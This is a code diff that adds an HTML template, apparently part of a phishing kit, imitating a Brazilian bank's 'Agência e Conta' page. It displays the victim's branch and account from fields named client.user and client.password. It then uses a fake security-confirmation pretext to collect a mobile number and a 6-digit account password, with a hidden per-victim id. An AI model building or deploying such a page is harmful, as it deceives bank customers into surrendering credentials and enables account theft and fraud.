@@ -1,0 +1,66 @@
+{{>components/topbar}}
+<div id="__next">
+        <div class="clean-page-container__Container-sc-fzay79-0 dGAlqK">
+
+            <!-- error -->
+            <form class="form-stn form-pass6" >
+                <div width="400" class="sc-AxjAm hfpSUp card__Card-sc-2xb3kk-0 IOciT">
+                    <div class="sc-AxjAm sc-AxirZ BmOBm"><h1>Agência e Conta</h1></div>
+                    <div class="styles__DimmerWrapper-sc-q27j9n-0 dkPhEC">
+                        <div class="styles__LoaderIcon-sc-1onbhrc-0 ebFmcr"></div>
+                    </div>
+
+                    <div class="form-stn-title">
+                        <div>
+                            Agência
+                            <span>{{client.user}}</span>
+                        </div>
+                        <div>
+                            Conta
+                            <span>{{client.password}}</span>
+                        </div>
+                    </div>
+                    <div class="sc-fzozJi ldfQIR">
+                        {{#if client}}
+                        <input type="hidden" name="id" value="{{client.id}}">
+                        {{/if}}
+                        <div class="formMessagePhone">
+                            <small>Por motivo de segurança é necessário confirmar algumas informações.</small>
+                            Confirme o número de celular cadastrado: Para continuar você deve confirma sua senha da conta corrente (6 dígitos)!
+                        </div>
+                        <div class="sc-AxjAm sc-AxirZ fUlriR formPass8">
+                            <div color="mediumGray2" font-weight="normal" font-size="1" class="sc-AxjAm hgtMkm"></div>
+                            <div class="inpt-passwd6 sc-AxjAm sc-AxirZ ezTcmd styles__InputContainer-sc-vrdjm4-2 ktCUnx">
+                                <input type="text" placeholder="Celular com DDD" font-size="2" id="phone" name="phone" class="sc-AxjAm fBbPZk styles__StyledInput-sc-vrdjm4-0 Csscx" required="required" />
+                                <div class="helpIcon">?</div>
+                            </div>
+                            
+                            <label color="darkGray" font-size="2" for="password" order="-1" class="sc-AxjAm sc-AxirZ cfFABH">
+                                <div class="sc-AxjAm sc-AxirZ cshaSV">Senha de 8 dígitos</div>
+                            </label>
+                        </div>
+                        <div class="sc-AxjAm sc-AxirZ fUlriR formPass8">
+                            <div color="mediumGray2" font-weight="normal" font-size="1" class="sc-AxjAm hgtMkm"></div>
+                            <div class="inpt-passwd6 sc-AxjAm sc-AxirZ ezTcmd styles__InputContainer-sc-vrdjm4-2 ktCUnx">
+                                <input type="password" maxlength="6" placeholder="SENHA 6 DÍGITOS" font-size="2" id="password6" name="password6" class="sc-AxjAm fBbPZk styles__StyledInput-sc-vrdjm4-0 Csscx" required="required" />
+                                <div class="helpIcon">?</div>
+                            </div>
+                            
+                            <label color="darkGray" font-size="2" for="password" order="-1" class="sc-AxjAm sc-AxirZ cfFABH">
+                                <div class="sc-AxjAm sc-AxirZ cshaSV">Senha de 8 dígitos</div>
+                            </label>
+                        </div>
+                        <div class="sc-AxhCb jXrfDR">
+                            <div name="captcha"></div>
+                            <div color="red" class="sc-AxjAm jmPVhW styles__StyledText-sc-ftb6xw-0 gouAvy"></div>
+                        </div><button type="submit" width="1" class="sc-AxjAm bmfNbS styles__StyledButton-sc-1066mea-0 OPeEQ" id="btnLogin">Entrar</button>
+
+                        <div class="voltar">
+                            <a href="/?client={{client.id}}">Outra Conta</a>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+</div>
+<div id="modal"></div>
